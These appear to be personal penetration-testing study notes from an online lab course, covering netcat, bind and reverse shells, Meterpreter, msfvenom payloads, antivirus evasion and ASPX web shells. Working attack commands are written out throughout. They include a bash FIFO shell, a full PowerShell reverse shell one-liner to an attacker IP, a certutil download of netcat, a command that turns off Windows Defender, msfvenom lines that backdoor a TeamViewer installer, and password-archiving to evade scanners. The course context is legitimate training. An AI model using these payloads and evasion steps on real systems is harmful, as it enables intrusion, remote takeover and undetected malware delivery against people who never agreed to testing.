#Basics VPN
At a high-level, VPN works by routing our connecting device's internet connection through the target VPN's private server instead of our internet service provider (ISP). When connected to a VPN, data originates from the VPN server rather than our computer and will appear to originate from a public IP address other than our own.

There are two main types of remote access VPNs: client-based VPN and SSL VPN. SSL VPN uses the web browser as the VPN client. The connection is established between the browser and an SSL VPN gateway can be configured to only allow access to web-based applications such as email and intranet sites, or even the internal network but without the need for the end user to install or use any specialized software. Client-based VPN requires the use of client software to establish the VPN connection. Once connected, the user's host will work mostly as if it were connected directly to the company network and will be able to access any resources (applications, hosts, subnets, etc.) allowed by the server configuration. Some corporate VPNs will provide employees with full access to the internal corporate network, while others will place users on a specific segment reserved for remote workers.

#Shells
[+] Anatomy of a Shell
  > Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator. Here are some of the most common terminal emulators:
  Terminal Emulator	Operating System
  Windows Terminal	Windows
  cmder	            Windows
  PuTTY	            Windows
  kitty	            Windows, Linux and MacOS
  Alacritty	        Windows, Linux and MacOS
  xterm	            Linux
  GNOME Terminal	  Linux
  MATE Terminal	    Linux
  Konsole	          Linux
  Terminal	        MacOS
  iTerm2	          MacOS
  
  > A way we can identify the language interpreter is by viewing the processes running on the machine. In Linux, we can do this using the following command:
    + Shell Validation From 'ps'
      m1l0js@htb[/htb]$ ps
      PID TTY          TIME CMD
      4232 pts/1    00:00:00 bash
      11435 pts/1    00:00:00 ps
  > We can also find out what shell language is in use by viewing the environment variables using the env command:
    + Shell Validation Using 'env'
      m1l0js@htb[/htb]$ env
      SHELL=/bin/bash
  > In powershell
    + Edition of PowerShell
      $PSversiontable 
  > One of the main points we can take away from this is a terminal emulator is not tied to one specific language. Actually, the shell language can be changed and customized to suit the sysadmin, developer, or pentester's personal preference, workflow, and technical needs.

* Netcat Fundamentals
	> Network utility used to read and write data to network connections using TCP or UDP
	[+] Netcat can be used to perform:
  		- Banner Grabbing
  		- Port Scanning
  		- Transferring Files
  		- Bind/Reverse Shells
	[+] nc 
		-v //verbose
	    	-u //udp
	    	-l //listen
	    	-n //nodns
	    	-e //exec 

    	[+] How to transfer nc.exe to a Windows machine

    	  		A: python3 -m http.server 80
    	  		V: certutil -urlcache -f http://<AttackIP>/nc.exe nc.exe
		> nc
    	  		A: vim test.txt
    	  		V: nc.exe -nvlp 1234 > test.txt
    	  		A: nc -nv VictimMachine 1234 < test.txt
* There's another Windows alternative to netcat coded in PowerShell called PowerCat (https://github.com/besimorhino/powercat)



* Bind Shells
  > With a bind shell, the target system has a listener started and awaits a connection from a pentester's system (attack box).
  + There can be many challenges associated with getting a shell this way. Here are some to consider:
    > There would have to be a listener already started on the target.
    > If there is no listener started, we would need to find a way to make this happen.
    > Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
    > Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.
	> Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.
  [+] Practicing with GNU Netcat
      + No. 1: Server - Target starting Netcat listener 
        Target@server:~$ nc -lvnp 7777
        Listening on [0.0.0.0] (family 0, port 7777)
    > In this instance, the target will be our server, and the attack box will be our client. Once we hit enter, the listener is started and awaiting a connection from the client.
    > Back on the client (attack box), we will use nc to connect to the listener we started on the server.
      + No. 2: Client - Attack box connecting to target
    > Notice how we are using nc on the client and the server. On the client-side, we specify the server's IP address and the port that we configured to listen on (7777). Once we successfully connect, we can see a succeeded! message on the client as shown above and a received! message on the server, as seen below.
      + No. 3: Server - Target receiving connection from client
        Target@server:~$ nc -lvnp 7777
        Listening on [0.0.0.0] (family 0, port 7777)
        Connection from 10.10.14.117 51872 received!    
    > Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.
      + No. 4: Client - Attack box sending message Hello Academy
        m1l0js@htb[/htb]$ nc -nv 10.129.41.200 7777
        Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
        Hello Academy  
    > Once we type the message and hit enter, we will notice the message is received on the server-side.
      + No. 5: Server - Target receiving Hello Academy message
        Victim@server:~$ nc -lvnp 7777
        Listening on [0.0.0.0] (family 0, port 7777)
        Connection from 10.10.14.117 51914 received!
        Hello Academy
    ! Note: When on the academy network (10.129.x.x/16) we can work with another academy student to connect to their target box and practice the concepts presented in this module.
  [+] Establishing a Basic Bind Shell with Netcat
    > We have shown that we can use Netcat to send text between the client and the server, but this is not a bind shell because we cannot interact with the OS and file system. We are only able to pass text within the pipe setup by Netcat. Let's use Netcat to serve up our shell to establish a real bind shell.
    > On the server-side, we will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.
      + No. 1: Server - Binding a Bash shell to the TCP session
        Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
      > The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.
      > Back on the client, use Netcat to connect to the server now that a shell on the server is being served.
        + No. 2: Client - Connecting to bind shell on target
          m1l0js@htb[/htb]$ nc -nv 10.129.41.200 7777
          Target@server:~$  
      > We will notice that we have successfully established a bind shell session with the target. Keep in mind that we had complete control over both our attack box and the target system in this scenario, which isn't typical. We worked through these exercises to understand the basics of the bind shell and how it works without any security controls (NAT enabled routers, hardware firewalls, Web Application Firewalls, IDS, IPS, OS firewalls, endpoint protection, authentication mechanisms, etc...) in place or exploits needed. This fundamental understanding will be helpful as we get into more challenging situations and realistic scenarios working with vulnerable systems.

      > As mentioned earlier in this section, it is also good to remember that the bind shell is much easier to defend against. Since the connection will be received incoming, it is more likely to get detected and blocked by firewalls even if standard ports are used when starting a listener. There are ways to get around this by using a reverse shell which we will discuss in the next section.
  [+] Other examples of netcat
    > A netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a client connects to the listener.
    > Example (From Linux to Windows)
    	V: nc -nvlp 1234 -e cmd.exe 
        	A: nc -nv 10.4.21.221 1234

    > Other example (From Windows to Linux)
    	A: nc -nvlp 1234 -c /bin/bash //In Linux

* Reverse shells
  > With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.
  > We will often use this kind of shell as we come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving us a better chance of going undetected. The last section discussed how bind shells rely on incoming connections allowed through the firewall on the server-side. It will be much harder to pull this off in a real-world scenario. As seen in the image above, we are starting a listener for a reverse shell on our attack box and using some method (example: Unrestricted File Upload, Command Injection, etc..) to force the target to initiate a connection with our target box, effectively meaning our attack box becomes the server and the target becomes the client.

  > We don't always need to re-invent the wheel when it comes to payloads (commands & code) we intend to use when attempting to establish a reverse shell with a target. There are helpful tools that infosec veterans have put together to assist us. Reverse Shell Cheat Sheet(https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is one fantastic resource that contains a list of different commands, code, and even automated reverse shell generators we can use when practicing or on an actual engagement. We should be mindful that many admins are aware of public repositories and open-source resources that penetration testers commonly use. They can reference these repos as part of their core considerations on what to expect from an attack and tune their security controls accordingly. In some cases, we may need to customize our attacks a bit.
  [+] Hands-on With A Simple Reverse Shell in Windows
    > With this walkthrough, we will be establishing a simple reverse shell using some PowerShell code on a Windows target. Let's start the target and begin. As a Metasploit user, we will meet these under the common names reverse_tcp, reverse_https, and bind_tcp.

    > We can start a Netcat listener on our attack box as the target spawns.
      + Server (attack box) 
        m1l0js@htb[/htb]$ sudo nc -lvnp 443
        Listening on 0.0.0.0 443

    > This time around with our listener, we are binding it to a common port (443 ==> https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html), this port usually is for HTTPS connections. We may want to use common ports like this because when we initiate the connection to our listener, we want to ensure it does not get blocked going outbound through the OS firewall and at the network level. It would be rare to see any security team blocking 443 outbound since many applications and organizations rely on HTTPS to get to various websites throughout the workday. That said, a firewall capable of deep packet inspection and Layer 7 visibility may be able to detect & stop a reverse shell going outbound on a common port because it's examining the contents of the network packets, not just the IP address and port. Detailed firewall evasion is outside of the scope of this module, so we will only briefly touch on detection & evasion techniques throughout the module, as well as in the dedicated section at the end.

    > Once the Windows target has spawned, let's connect using RDP.
    > Netcat can be used to initiate the reverse shell on the Windows side, but we must be mindful of what applications are present on the system already. Netcat is not native to Windows systems, so it may be unreliable to count on using it as our tool on the Windows side. We will see in a later section that to use Netcat in Windows, we must transfer a Netcat binary over to a target, which can be tricky when we don't have file upload capabilities from the start. That said, it's ideal to use whatever tools are native (living off the land) to the target we are trying to gain access to.
    > What applications and shell languages are hosted on the target?
    > This is an excellent question to ask any time we are trying to establish a reverse shell. Let's use command prompt & PowerShell to establish this simple reverse shell. We can use a standard PowerShell reverse shell one-liner to illustrate this point.
    > On the Windows target, open a command prompt and copy & paste this command:
      + Client (target)
        powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

    ! Note: If we are using Pwnbox, keep in mind that some browsers do not work as seamlessly when using the Clipboard feature to paste a command directly into the CLI of a target. In these cases, we may want to paste into Notepad on the target, then copy & paste from inside the target.

    > Please take a close look at the command and consider what we need to change for this to allow us to establish a reverse shell with our attack box. This PowerShell code can also be called shell code or our payload. Delivering this payload onto the Windows system was pretty straightforward, considering we have complete control of the target for demonstration purposes. As this module progresses, we will notice the difficulty increases in how we deliver the payload onto targets.

    > What happened when we hit enter in command prompt?
      + Client (target)
        This script contains malicious content and has been blocked by your antivirus software.
    > The Windows Defender antivirus (AV) software stopped the execution of the code. This is working exactly as intended, and from a defensive perspective, this is a win. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the Virus & threat protection settings or by using this command in an administrative PowerShell console (right-click, run as admin):
      + Disable AV
        PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
    > Once AV is disabled, attempt to execute the code again.
      + Server (attack box)
        m1l0js@htb[/htb]$ sudo nc -lvnp 443
        Listening on 0.0.0.0 443
        Connection received on 10.129.36.68 49674

    > The commands above make up a common one-liner issued on a Linux system to serve a Bash shell on a network socket utilizing a Netcat listener. We used this earlier in the Bind Shells section. It's often copied & pasted but not often understood. Let's break down each portion of the one-liner:
      + Remove /tmp/f
        rm -f /tmp/f; 
    > Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequentially.

    > Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (|).
      + Set Shell Options
        /bin/bash -i 2>&1 | 
    > Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2) & standard input data stream (1) are redirected to the command following the pipe (|).
      + Open a Connection with Netcat
        nc 10.10.14.12 7777 > /tmp/f  
    > Uses Netcat to send a connection to our attack host 10.10.14.12 listening on port 7777. The output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed
  
  * PowerShell One-liner Explained
    > The shells & payloads we choose to use largely depend on which OS we are attacking. Be mindful of this as we continue throughout the module. We witnessed this in the reverse shells section by establishing a reverse shell with a Windows system using PowerShell. Let's breakdown the one-liner we used:
    Powershell One-liner
      powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    > We will dissect the rather large PowerShell command you can see above. It may look like a lot, but hopefully, we can demystify it a bit.
      + Calling PowerShell
        powershell -nop -c 
    > Executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in cmd.exe.
      + Binding a socket
        "$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,433);
    > Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses (10.10.14.158,443). The semi-colon (;) ensures the commands & code are executed sequentially.
      + Setting The Command Stream
        $stream = $client.GetStream();
    > Sets/evaluates the variable $stream equal to (=) the $client variable and the .NET framework method called GetStream that facilitates network communications. The semi-colon (;) ensures the commands & code are executed sequentially.
      + Empty Byte Stream
        [byte[]]$bytes = 0..65535|%{0}; 
    > Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.
      + Stream Parameters
          while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    > Starts a while loop containing the $i variable set equal to (=) the .NET framework Stream.Read => (https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) ($stream.Read) method. The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method.
      + Set the Byte Encoding
        {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    > Sets/evaluates the variable $data equal to (=) an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream ($bytes) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (;) ensures the commands & code are executed sequentially.
      + Invoke-Expression
        $sendback = (iex $data 2>&1 | Out-String ); 
    > Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2>) & standard input (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (;) ensures the commands & code are executed sequentially.
      + Show working Directory
        $sendback2 = $sendback + 'PS ' + (pwd).path + '> ';` 
    > Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string PS ('PS') plus + path to the working directory ((pwd).path) plus (+) the string '> '.

    > Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.

* Meterpreter
    > The Meterpreter Payload is a specific type of multi-faceted, extensible Payload that uses DLL injection to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.

    > It is dubbed the swiss army knife of pentesting, and for a good reason. The purpose of Meterpreter is to specifically improve our post-exploitation procedures, offering us a hand-picked set of relevant tools for more straightforward enumeration of the target host from the inside. It can help us find various privilege escalation techniques, AV evasion techniques, further vulnerability research, provide persistent access, pivot, etc.

    > For some interesting reading, check out this post(https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/) on Meterpreter stageless payloads and this post(https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion/) on modifying Metasploit templates for evasion. These topics are outside the scope of this module, but we should be awarer of these possibilities.

[+] Running Meterpreter

    > To run Meterpreter, we only need to select any version of it from the show payloads output, taking into consideration the type of connection and OS we are attacking.
    > When the exploit is completed, the following events occur:
    
        + The target executes the initial stager. This is usually a bind, reverse, findtag, passivex, etc.
        + The stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL.
        + The Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends a GET. Metasploit receives this GET and configures the client.
        + Lastly, Meterpreter loads extensions. It will always load stdapi and load priv if the module gives administrative rights. All of these extensions are loaded over AES encryption.
    
    > Whenever the Meterpreter Payload is sent and run on the target system, we receive a Meterpreter shell.

[+] Writing and importing modules
    > To install any new Metasploit modules which have already been ported over by other users, one can choose to update their msfconsole from the terminal, which will ensure that all newest exploits, auxiliaries, and features will be installed in the latest version of msfconsole. As long as the ported modules have been pushed into the main Metasploit-framework branch on GitHub, we should be updated with the latest modules.

    > However, if we need only a specific module and do not want to perform a full upgrade, we can download that module and install it manually. We will focus on searching ExploitDB for readily available Metasploit modules, which we can directly import into our version of msfconsole locally.

    > ExploitDB is a great choice when searching for a custom exploit. We can use tags to search through the different exploitation scenarios for each available script. One of these tags is Metasploit Framework (MSF), which, if selected, will display only scripts that are also available in Metasploit module format. These can be directly downloaded from ExploitDB and installed in our local Metasploit Framework directory, from where they can be searched and called from within the msfconsole.

    ! Example
        > Let's say we want to use an exploit found for Nagios3, which will take advantage of a command injection vulnerability. The module we are looking for is Nagios3 - 'statuswml.cgi' Command Injection (Metasploit). So we fire up msfconsole and try to search for that specific exploit, but we cannot find it. This means that our Metasploit framework is not up to date or that the specific Nagios3 exploit module we are looking for is not in the official updated release of the Metasploit Framework.
        > We can, however, find the exploit code inside ExploitDB's entries. Alternatively, if we do not want to use our web browser to search for a specific exploit within ExploitDB, we can use the CLI version, searchsploit.
        > Note that the hosted file terminations that end in .rb are Ruby scripts that most likely have been crafted specifically for use within msfconsole. We can also filter only by .rb file terminations to avoid output from scripts that cannot run within msfconsole. Note that not all .rb files are automatically converted to msfconsole modules. Some exploits are written in Ruby without having any Metasploit module-compatible code in them. We will look at one of these examples in the following sub-section.
            m1l0js@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"
        > We have to download the .rb file and place it in the correct directory. The default directory where all the modules, scripts, plugins, and msfconsole proprietary files are stored is /usr/share/metasploit-framework. The critical folders are also symlinked in our home and root folders in the hidden ~/.msf4/ location.
            m1l0js@htb[/htb]$ ls /usr/share/metasploit-framework/
            m1l0js@htb[/htb]$ ls .msf4/
        > We copy it into the appropriate directory after downloading the exploit. Note that our home folder .msf4 location might not have all the folder structure that the /usr/share/metasploit-framework/ one might have. So, we will just need to mkdir the appropriate folders so that the structure is the same as the original folder so that msfconsole can find the new modules. After that, we will be proceeding with copying the .rb script directly into the primary location.

        > Please note that there are certain naming conventions that, if not adequately respected, will generate errors when trying to get msfconsole to recognize the new module we installed. Always use snake-case, alphanumeric characters, and underscores instead of dashes.

[+] Introduction to MSFVenom
    > MSFVenom is the successor of MSFPayload and MSFEncode, two stand-alone scripts that used to work in conjunction with msfconsole to provide users with highly customizable and hard-to-detect payloads for their exploits.
    > MSFVenom is the result of the marriage between these two tools. Before this tool, we had to pipe (|) the result from MSFPayload, which was used to generate shellcode for a specific processor architecture and OS release, into MSFEncode, which contained multiple encoding schemes used both for removing bad characters from shellcode. This could sometimes cause instability during the runtime - and for evading older Anti-Virus (AV) and endpoint Intrusion Prevention / Intrusion Detection (IPS/IDS) software.
    > Nowadays, the two combined tools offer penetration testers a method to quickly craft payloads for different target host architectures and releases while having the possibility to 'clean up' their shellcode so that it does not run into any errors when deployed. The AV evasion part is much more complicated today, as signature-only-based analysis of malicious files is a thing of the past. Heuristic analysis, machine learning, and deep packet inspection make it much harder for a payload to run through several subsequent iterations of an encoding scheme to evade any good AV software. 

    * Creating our payloads
        > Let's suppose we have found an open FTP port that either had weak credentials or was open to Anonymous login by accident. Now, suppose that the FTP server itself is linked to a web service running on port tcp/80 of the same machine and that all of the files found in the FTP root directory can be viewed in the web-service's /uploads directory. Let's also suppose that the web service does not have any checks for what we are allowed to run on it as a client.
        > Suppose we are hypothetically allowed to call anything we want from the web service. In that case, we can upload a PHP shell directly through the FTP server and access it from the web, triggering the payload and allowing us to receive a reverse TCP connection from the victim machine.
            m1l0js@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
        > Now, we only need to navigate to http://10.10.10.5/reverse_shell.aspx, and it will trigger the .aspx payload. Before we do that, however, we should start a listener on msfconsole so that the reverse connection request gets caught inside it.
            msf6 > use multi/handler
                
        > Now we can trigger the .aspx payload on the web service. Doing so will load absolutely nothing visually speaking on the page, but looking back to our multi/handler module, we would have received a connection. We should ensure that our .aspx file does not contain HTML, so we will only see a blank web page. However, the payload is executed in the background anyway.
        > If the Meterpreter session dies too often, we can consider encoding it to avoid errors during runtime. We can pick any viable encoder, and it will ultimately improve our chances of success regardless.
    * Local Exploit Suggester
        > As a tip, there is a module called the Local Exploit Suggester. We will be using this module for this example, as the Meterpreter shell landed on the IIS APPPOOL\Web user, which naturally does not have many permissions. Furthermore, running the sysinfo command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester.
        > It finishes using other suggested exploit



[+] Firewall and IDS/IPS evasion
Security Policy	                            Description
Signature-based Detection	                The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. 
                                            Any 100% match against these signatures will generate alarms.
Heuristic / Statistical Anomaly Detection	Behavioral comparison against an established baseline included modus-operandi signatures for known APTs (Advanced Persistent Threats). 
                                            The baseline will identify the norm for the network and what protocols are commonly used. Any deviation from the maximum threshold will generate alarms.
Stateful Protocol Analysis Detection	    Recognizing the divergence of protocols stated by event comparison using pre-built profiles of generally accepted definitions of non-malicious activity.
Live-monitoring and Alerting (SOC-based)	A team of analysts in a dedicated, in-house, or leased SOC (Security Operations Center) use live-feed software to monitor network activity 
                                            and intermediate alarming systems for any potential threats, either deciding themselves if the threat should be actioned upon or letting the 
                                            automated mechanisms take action instead.
* Evasion Techniques

    > Most host-based anti-virus software nowadays relies mainly on Signature-based Detection to identify aspects of malicious code present in a software sample. These signatures are placed inside the Antivirus Engine, where they are subsequently used to scan storage space and running processes for any matches. When a piece of unknown software lands on a partition and is matched by the Antivirus software, most Anti-viruses quarantine the malicious program and kill the running process.
    > How do we circumvent all this heat? We play along with it. The examples shown in the Encoders section show that simply encoding payloads using different encoding schemes with multiple iterations is not enough for all AV products. Moreover, merely establishing a channel of communication between the attacker and the victim can raise some alarms with the current capabilities of IDS/IPS products out there.
    > However, with the MSF6 release, msfconsole can tunnel AES-encrypted communication from any Meterpreter shell back to the attacker host, successfully encrypting the traffic as the payload is sent to the victim host. This mostly takes care of the network-based IDS/IPS. In some rare cases, we might be met with very strict traffic rulesets that flag our connection based on the sender's IP address. The only way to circumvent this is to find the services being let through. An excellent example of this would be the Equifax hack of 2017, where malicious hackers have abused the Apache Struts vulnerability to access a network of critical data servers. DNS exfiltration techniques were used to slowly siphon data out of the network and into the hackers' domain without being noticed for months. To learn more about this attack, visit the links below:
        + US Government Post-Mortem Report on the Equifax Hack
        + Protecting from DNS Exfiltration
        + Stoping Data Exfil and Malware Spread through DNS
    > Returning to msfconsole, its capability to now sustain AES-encrypted tunnels, together with Meterpreter's feature of running in memory, raises our capability by a margin. However, we still have the issue of what happens to a payload once it reaches its destination, before it is run and placed into memory. This file could be fingerprinted for its signature, matched against the database, and blocked, together with our chances of accessing the target. We can also be sure that AV software developers are looking at msfconsole modules and capabilities to add the resulting code and files to their signature database, resulting in most if not all of the default payloads being immediately shut down by AV software nowadays.
    > We are in luck because msfvenom offers the option of using executable templates. This allows us to use some pre-set templates for executable files, inject our payload into them (no pun intended), and use any executable as a platform from which we can launch our attack. We can embed the shellcode into any installer, package, or program that we have at hand, hiding the payload shellcode deep within the legitimate code of the actual product. This greatly obfuscates our malicious code and, more importantly, lowers our detection chances. There are many valid combinations between actual, legitimate executable files, our different encoding schemes (and their iterations), and our different payload shellcode variants. This generates what is called a backdoored executable.
        m1l0js@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

    > For the most part, when a target launches a backdoored executable, nothing will appear to happen, which can raise suspicions in some cases. To improve our chances, we need to trigger the continuation of the normal execution of the launched application while pulling the payload in a separate thread from the main application. We do so with the -k flag as it appears above. However, even with the -k flag running, the target will only notice the running backdoor if they launch the backdoored executable template from a CLI environment. If they do so, a separate window will pop up with the payload, which will not close until we finish running the payload session interaction on the target.


    + Archives
        > Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today. However, the downside of this process is that they will be raised as notifications in the AV alarm dashboard as being unable to be scanned due to being locked with a password. An administrator can choose to manually inspect these archives to determine if they are malicious or not.
            m1l0js@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

        > If we check against VirusTotal to get a detection baseline from the payload we generated, the results will be the following.
            m1l0js@htb[/htb]$ msf-virustotal -k <API key> -f test.js 
        > Now, try archiving it two times, passwording both archives upon creation, and removing the .rar/.zip/.7z extension from their names. For this purpose, we can install the RAR(https://www.rarlab.com/download.htm) utility from RARLabs, which works precisely like WinRAR on Windows.
            m1l0js@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
            m1l0js@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
            m1l0js@htb[/htb]$ rar a ~/test.rar -p ~/test.js

            m1l0js@htb[/htb]$ mv test2.rar test2
            m1l0js@htb[/htb]$ ls
            test   test2   test.js
        
        > The test2 file is the final .rar archive with the extension (.rar) deleted from the name. After that, we can proceed to upload it on VirusTotal for another check.
            m1l0js@htb[/htb]$ msf-virustotal -k <API key> -f test2
            //Success. False in all AV solutions

    + Packers
        > The term Packer refers to the result of an executable compression process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.

    + Exploit Coding
        > When coding our exploit or porting a pre-existing one over to the Framework, it is good to ensure that the exploit code is not easily identifiable by security measures implemented on the target system.
        > For example, a typical Buffer Overflow exploit might be easily distinguished from regular traffic traveling over the network due to its hexadecimal buffer patterns. IDS / IPS placements can check the traffic towards the target machine and notice specific overused patterns for exploiting code.
        > When assembling our exploit code, randomization can help add some variation to those patterns, which will break the IPS / IDS database signatures for well-known exploit buffers. This can be done by inputting an Offset switch inside the code for the msfconsole module:
            'Targets' =>
            [
             	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
            ],
        > Besides the BoF code, one should always avoid using obvious NOP sleds where the shellcode should land after the overflow is completed. Please note that the BoF code's purpose is to crash the service running on the target machine, while the NOP sled is the allocated memory where our shellcode (the payload) is inserted. IPS/IDS entities regularly check both of these, so it is good to test our custom exploit code against a sandbox environment before deploying it on the client network. Of course, we might only have one chance to do this correctly during an assessment.

        > For more information about exploit coding, we recommend checking out the Metasploit - The Penetration Tester's Guide book(https://nostarch.com/metasploit) from No Starch Press. They delve into quite some detail about creating our exploits for the Framework.

For specific files such as the shells, you must edit the file first to insert your attacking host IP address to ensure you can access the web shell or receive a callback in the instance that you use a reverse shell. Before using the different files, be sure to read the contents and comments to ensure you take the proper actions.
		+ Move a copy for modification
		    m1l0js@htb[/htb]$ cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx
		+ Add your IP address to the allowedIps variable on line 59. Make any other changes you wish. It can be prudent to remove the ASCII art and comments from the file. These items in a payload are often signatured on and can alert the defenders/AV to what you are doing.
		> Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. shell.php and upload it, and then access our uploaded file to execute commands.
		> Once the upload is successful, you will need to navigate to your web shell to utilize its functions. The image below shows us how to do it. As seen from the last image, our shell was uploaded to the \\files\ directory, and the name was kept the same. This won't always be the case. You may run into some implementations that randomize filenames on upload that do not have a public files directory or any number of other potential safeguards. For now, we are lucky that's not the case. With this particular web application, our file went to status.inlanefreight.local\\files\demo.aspx and will require us to browse for the upload by using that \ in the path instead of the / like normal. Once you do this, your browser will clean it up in your URL window to appear as status.inlanefreight.local//files/demo.aspx.

    > ASPX eplained
      + Active Server Page Extended (ASPX) is a file type/extension written for Microsoft's ASP.NET Framework. On a web server running the ASP.NET framework, web form pages can be generated for users to input data. On the server side, the information will be converted into HTML. We can take advantage of this by using an ASPX-based web shell to control the underlying Windows operating system. Let's witness this first-hand by utilizing the Antak Webshell.
    > Antak Webshell
      + Antak is a web shell built-in ASP.Net included within the Nishang project. Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest. Since we are focused on web applications for the moment, let's keep our eyes on Antak. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server. The UI is even themed like PowerShell. It's time to dive in and experiment with Antak.
      + Antak web shell functions like a Powershell Console. However, it will execute each command as a new process. It can also execute scripts in memory and encode commands you send. As a web shell, Antak is a pretty powerful tool.
      > Working with Antak
        + The Antak files can be found in the /usr/share/nishang/Antak-WebShell directory.

